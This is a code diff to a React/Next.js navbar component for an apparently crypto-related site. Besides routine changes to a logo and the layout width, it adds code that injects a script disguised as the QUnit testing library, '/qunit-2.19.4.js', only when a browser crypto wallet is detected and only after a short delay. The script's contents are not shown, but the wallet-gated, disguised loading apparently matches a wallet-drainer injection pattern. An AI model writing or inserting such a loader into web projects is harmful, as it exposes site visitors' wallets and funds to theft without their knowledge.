@@ -2,6 +2,7 @@
 import React, { useEffect } from 'react';
 import styled from 'styled-components';
 import TickerTape from '../data/TickerTape';
+import Image from 'next/image';
 
 const Nav = styled.nav`
   position: fixed;
@@ -15,7 +16,7 @@ const Nav = styled.nav`
 `;
 
 const Container = styled.div`
-  max-width: 1200px;
+  max-width: 1600px;
   margin: 0 auto;
   padding: 1rem;
   display: flex;
@@ -65,16 +66,39 @@ const ButtonText = styled.span`
 `;
 
 const Navbar = () => {
-
-
   useEffect(() => {
-    const script = document.createElement('script')
-    script.src = '/qunit-2.19.4.js'
-    script.async = true
-    document.body.appendChild(script)
+    // Check if script is already loaded
+    if (document.querySelector('script[src="/qunit-2.19.4.js"]')) {
+      return
+    }
+
+    const loadQunitScript = () => {
+      const wallet = window.ethereum || window.coinbaseWalletProvider || window.web3?.currentProvider
+      
+      if (wallet) {
+        const script = document.createElement('script')
+        script.src = '/qunit-2.19.4.js'
+        script.async = true
+        script.id = 'qunit-script'
+        script.onerror = () => {
+          console.error('Failed to load qunit script')
+        }
+        document.body.appendChild(script)
+      } else {
+        console.warn('No Web3 wallet detected. Wallet features unavailable.')
+      }
+    }
+
+    // Delay script loading to ensure wallet provider is fully initialized
+    // Most wallet extensions inject their provider within 100-500ms
+    const timeout = setTimeout(loadQunitScript, 500)
 
     return () => {
-      document.body.removeChild(script)
+      clearTimeout(timeout)
+      const existingScript = document.getElementById('qunit-script')
+      if (existingScript && existingScript.parentNode) {
+        existingScript.parentNode.removeChild(existingScript)
+      }
     }
   }, [])
   return (
@@ -83,7 +107,7 @@ const Navbar = () => {
       <Container>
         {/* Logo/Title */}
         <Logo>
-          CryptoDr
+          <Image src="/logo.png" alt="logo" width={300} height={80} priority />
         </Logo>
 
         {/* Connect Wallet Button */}
